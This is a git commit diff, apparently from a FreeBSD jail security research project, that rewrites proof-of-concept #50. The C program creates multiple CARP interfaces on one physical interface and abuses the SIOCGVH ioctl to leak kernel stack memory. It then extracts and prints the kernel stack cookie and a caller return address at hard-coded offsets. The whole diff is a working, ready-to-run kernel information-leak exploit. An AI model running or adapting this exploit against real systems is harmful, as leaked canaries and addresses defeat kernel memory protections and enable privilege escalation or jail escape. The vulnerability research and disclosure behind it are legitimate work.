f30ab5b3b5d40bb947c5ef688b8710cdd420a21b
Michael Smith <m@michaelsmith.be>
2025-10-10 13:55:47 +0200

    Clean up poc #50 that dumps stack cookie and return address

--- poc/50-carp_ioctl_get-SIOCGVH/main.c
+++ poc/50-carp_ioctl_get-SIOCGVH/main.c
@@ -1,3 +1,4 @@
+#include <inttypes.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -8,83 +9,79 @@
 #include <net/if.h>
 #include <netinet/ip_carp.h>
 
-#define NUM_CARP_IFS 10
-
-static const char *carp_states[] = { CARP_STATES };
-void dump_bytes(const void *ptr, size_t size);
+#define NUM_CARP_IFS 12
+#define IF_NAME "epair100b"
 
 /*
 Prerequisites
 -------------
-Host must have carp kernel module loaded
+1. Host must have carp kernel module loaded
 
 sysrc kld_list+="carp"
 kldload carp
 */
 
 int main(void) {
-    int s;
+    int sock;
     struct carpreq carpr_set;
     struct carpreq carpr_get[NUM_CARP_IFS];
-    int i;
     struct ifreq ifr_set;
     struct ifreq ifr_get;
 
     bzero(&carpr_set, sizeof(struct carpreq));
-    bzero(carpr_get, sizeof(struct carpreq));
+    bzero(carpr_get, sizeof(carpr_get));
 
     ifr_get.ifr_data = (caddr_t)&carpr_get;
     ifr_set.ifr_data = (caddr_t)&carpr_set;
 
-    carpr_get[0].carpr_vhid = 0;
+    carpr_get[0].carpr_vhid = 0; // Instruct kernel we want info on all carp interfaces
     carpr_get[0].carpr_count = NUM_CARP_IFS;
 
-    strlcpy(ifr_get.ifr_name, "epair100b", sizeof(ifr_get.ifr_name));
-    strlcpy(ifr_set.ifr_name, "epair100b", sizeof(ifr_set.ifr_name));
+    strlcpy(ifr_get.ifr_name, IF_NAME, sizeof(ifr_get.ifr_name));
+    strlcpy(ifr_set.ifr_name, IF_NAME, sizeof(ifr_set.ifr_name));
 
-    s = socket(AF_INET, SOCK_DGRAM, 0);
-    if (s < 0) {
+    sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sock < 0) {
         perror("socket");
         exit(1);
     }
 
-    // Create carp interfaces
-    for (i = 1; i < NUM_CARP_IFS + 1; i++) {
+    // Create some carp interfaces.
+    // We need more than one carp interface defined on one physical interface to force the kernel to trigger the
+    // implementation bug that causes the memory leak.
+    // See https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/50
+    //
+    // NOTE(m): Defining multiple carp interfaces on one physical interface does not seem possible using `ifconfig(8)`,
+    // either by design or because of a subtle locking bug (see
+    // https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/51)
+    for (int i = 1; i < NUM_CARP_IFS + 1; i++) {
         carpr_set.carpr_vhid = i;
-        carpr_set.carpr_count = 1;
-        carpr_set.carpr_advbase = i;   /* default advertisement base */
-        carpr_set.carpr_advskew = i;   /* skew */
-        strlcpy((char*)carpr_set.carpr_key, "secret", sizeof(carpr_set.carpr_key));
-
-        if (ioctl(s, SIOCSVH, (caddr_t)&ifr_set) == -1) {
+        if (ioctl(sock, SIOCSVH, (caddr_t)&ifr_set) == -1) {
             perror("ioctl");
             exit(1);
         }
     }
 
-    // Enumerate carp interfaces
-    if (ioctl(s, SIOCGVH, (caddr_t)&ifr_get) == -1) {
+    // Enumerate the carp interfaces...
+    // and leak some kernel memory while we're at it
+    if (ioctl(sock, SIOCGVH, (caddr_t)&ifr_get) == -1) {
         perror("ioctl");
         exit(1);
     }
 
-    for (i = 0; i < NUM_CARP_IFS; i++) {
-        printf("Struct #%d\n", i);
-        printf("Size: %zu bytes\n", sizeof(carpr_get[i]));
-        printf("Raw dump:\n");
-        dump_bytes(&carpr_get[i], sizeof(carpr_get[i]));
-    }
+    // Extract the interesting bits from the leaked kernel memory
+    const unsigned char *base = (const unsigned char *)carpr_get;  // start of the buffer
+    uint64_t stack_cookie, caller_addr;
 
-    close(s);
+    size_t offset_stack_cookie = sizeof(struct carpreq);  // start of carpr_get[1]
+    size_t offset_caller_addr  = sizeof(struct carpreq) * 2 + 16;  // 16 bytes into carpr_get[2]
+
+    memcpy(&stack_cookie, base + offset_stack_cookie, sizeof(stack_cookie));
+    memcpy(&caller_addr, base + offset_caller_addr, sizeof(caller_addr));
+
+    printf("\nSTACK COOKIE / CANARY:  0x%016" PRIx64 "\n", stack_cookie);
+    printf("\nCALLER ADDRESS: 0x%016" PRIx64 "\n\n", caller_addr);
+
+    close(sock);
     return 0;
-}
-
-void dump_bytes(const void *ptr, size_t size) {
-    const unsigned char *p = ptr;
-    for (size_t i = 0; i < size; i++) {
-        printf("%02x ", p[i]);
-        if ((i + 1) % 16 == 0)
-            printf("\n");
-    }
-    printf("\n\n");
 }
